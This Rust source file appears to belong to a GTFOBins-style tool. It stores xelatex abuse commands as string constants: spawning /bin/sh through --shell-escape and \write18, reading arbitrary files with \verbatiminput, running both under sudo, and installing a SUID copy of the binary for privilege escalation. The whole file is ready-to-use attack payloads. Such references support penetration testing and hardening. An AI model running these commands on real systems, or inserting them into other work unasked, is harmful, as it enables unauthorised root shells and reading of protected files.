pub static BIN_NAME: &'static str = "xelatex";
pub static SH_CODE: &'static str = r#"
    
    xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
"#;
pub static FR_DESC: &'static str = "The read file will be part of the output.";
pub static FR_CODE: &'static str = r#"
    
    xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
    strings article.dvi
"#;
pub static SUDO_DESC_1: &'static str = "The read file will be part of the output.";
pub static SUDO_CODE_1: &'static str = r#"
    
    sudo xelatex '\documentclass{article}\usepackage{verbatim}\begin{document}\verbatiminput{file_to_read}\end{document}'
    strings article.dvi
"#;
pub static SUDO_CODE_2: &'static str = r#"
    
    sudo xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which xelatex) .

    ./xelatex --shell-escape '\documentclass{article}\begin{document}\immediate\write18{/bin/sh}\end{document}'
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code {
    title: "SHELL_CODE",
    code: SH_CODE,
    tag: Tag::SH,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUDO_1: Code<'static> = Code {
    title: "SUDO_CODE_1",
    code: SUDO_CODE_1,
    tag: Tag::SUDO,
};
pub static SUDO_2: Code<'static> = Code {
    title: "SUDO_CODE_2",
    code: SUDO_CODE_2,
    tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code {
    title: "LSUID_CODE",
    code: LSUID_CODE,
    tag: Tag::LSUID,
};
